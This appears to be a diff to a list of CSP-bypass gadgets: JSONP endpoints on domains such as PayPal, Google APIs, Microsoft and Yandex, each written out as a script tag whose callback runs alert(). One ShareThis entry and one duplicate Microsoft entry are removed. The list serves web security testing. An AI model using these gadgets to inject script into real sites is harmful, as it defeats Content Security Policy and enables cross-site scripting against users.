@@ -111,7 +111,6 @@ connectad.io	<script src="https://connectad.io/wp-json?_jsonp=window.alert"></sc
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 content.googleapis.com	<script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>
 content.googleapis.com  <script src="https://content.googleapis.com/drive/v2beta/apps?callback=alert(1)"></script>
-count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
 core.helloretail.com  <script src="https://core.helloretail.com/partner/init.html?jsonp=alert(1)"></script>
 core-renderer-tiles.maps.yandex.net  <script src="https://core-renderer-tiles.maps.yandex.net/tiles?l=mapj&v=1&x=1&y=520&z=11&callback=alert"></script>
 core-stv-renderer.maps.yandex.net  <script src="https://core-stv-renderer.maps.yandex.net/2.x/tiles?l=stj&x=1&y=1&z=11&scale=1&v=1&format=js&callback=alert"></script>
@@ -347,7 +346,6 @@ www.indexexchange.com	<script src="https://www.indexexchange.com/wp-json?_jsonp=
 www.ipinfo.io	<script src="https://www.ipinfo.io/?format=jsonp&callback=alert"></script>
 www.juicer.io  <script src="https://www.juicer.io/api/feeds/1?callback=alert(1)"></script>
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
-www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=window.alert"></script>
 www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=window.alert"></script>
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
 www.paytr.com	<script src="https://www.paytr.com/wp-json?_jsonp=window.alert"></script>
